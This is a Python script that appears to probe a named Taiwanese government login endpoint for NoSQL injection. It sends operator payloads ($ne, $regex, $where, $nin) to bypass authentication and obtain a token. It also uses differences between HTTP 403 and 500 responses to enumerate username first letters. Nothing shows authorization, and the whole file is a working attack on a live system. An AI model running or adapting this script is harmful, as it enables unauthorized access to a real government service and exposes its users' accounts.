#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
NoSQL 注入差分探测脚本 (epcr.tpf.gov.tw:4004 /login)
目标:
  1) 用 403(多匹配) vs 500(单/零匹配) 做用户名首字母枚举 oracle
  2) 尝试不同 NoSQL 组合, 看能否拿到 token (200)
  3) 记录每种组合的 HTTP code + body, 建立行为矩阵
"""
import json, ssl, urllib.request, urllib.error, time, sys

BASE = "https://epcr.tpf.gov.tw:4004/login"
CTX = ssl.create_default_context()
CTX.check_hostname = False
CTX.verify_mode = ssl.CERT_NONE

def post(body):
    data = json.dumps(body).encode()
    req = urllib.request.Request(BASE, data=data, method="POST",
        headers={"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"})
    try:
        r = urllib.request.urlopen(req, timeout=12, context=CTX)
        code = r.getcode()
        return code, r.read().decode("utf-8", "replace")
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode("utf-8", "replace")
    except Exception as e:
        return None, repr(e)

def classify(code, body):
    if code == 200: return "TOKEN?"
    if code == 403: return "403-multi"
    if code == 500: return "500-type"
    if code == 401: return "401-noauth"
    if code is None: return "ERR"
    return f"code={code}"

# 1) 建立基础行为矩阵
print("=== 行为矩阵 ===")
matrix = [
    ("plain-string-user", {"username":"admin","password":"admin","captcha":"1234","domain":"AUTH_SERVER"}),
    ("plain-string-user2", {"username":"testuser123","password":"wrongpass","captcha":"1234","domain":"AUTH_SERVER"}),
    ("ne-both", {"username":{"$ne":None},"password":{"$ne":None},"captcha":"1234","domain":"AUTH_SERVER"}),
    ("ne-user-only", {"username":{"$ne":None},"password":"testpass","captcha":"1234","domain":"AUTH_SERVER"}),
    ("ne-pass-only", {"username":"admin","password":{"$ne":None},"captcha":"1234","domain":"AUTH_SERVER"}),
    ("ne-both-nocaptcha", {"username":{"$ne":None},"password":{"$ne":None},"domain":"AUTH_SERVER"}),
    ("exists-both", {"username":{"$exists":True},"password":{"$exists":True},"captcha":"1234","domain":"AUTH_SERVER"}),
    ("where-true-both", {"username":{"$where":"true"},"password":{"$where":"true"},"captcha":"1234","domain":"AUTH_SERVER"}),
    ("regex-all-both", {"username":{"$regex":".*"},"password":{"$regex":".*"},"captcha":"1234","domain":"AUTH_SERVER"}),
    ("nin-empty-both", {"username":{"$nin":[]},"password":{"$nin":[]},"captcha":"1234","domain":"AUTH_SERVER"}),
    ("nin-nonempty-user", {"username":{"$nin":["__no_such_user__"]},"password":{"$ne":None},"captcha":"1234","domain":"AUTH_SERVER"}),
]
for name, body in matrix:
    code, b = post(body)
    print(f"[{name:20s}] -> {code} {classify(code,b):10s} | {b[:80]}")
    time.sleep(0.2)

# 2) 用户名首字母枚举 oracle: username:{$regex:"^X"}, password:{$regex:".*"}
#    403 => 该前缀有 >=2 个用户; 500 => 0 或 1 个用户
print("\n=== 用户名首字母枚举 (403=多,500=0/1) ===")
import string
letters = string.ascii_lowercase + string.digits + "_."
for ch in letters:
    body = {"username":{"$regex":f"^{ch}"},"password":{"$regex":".*"},"captcha":"1234","domain":"AUTH_SERVER"}
    code, b = post(body)
    tag = classify(code,b)
    mark = "  <== multi-user" if code==403 else ""
    print(f"  username ^{ch!r} -> {code} {tag}{mark}")
    time.sleep(0.15)

print("\nDONE")
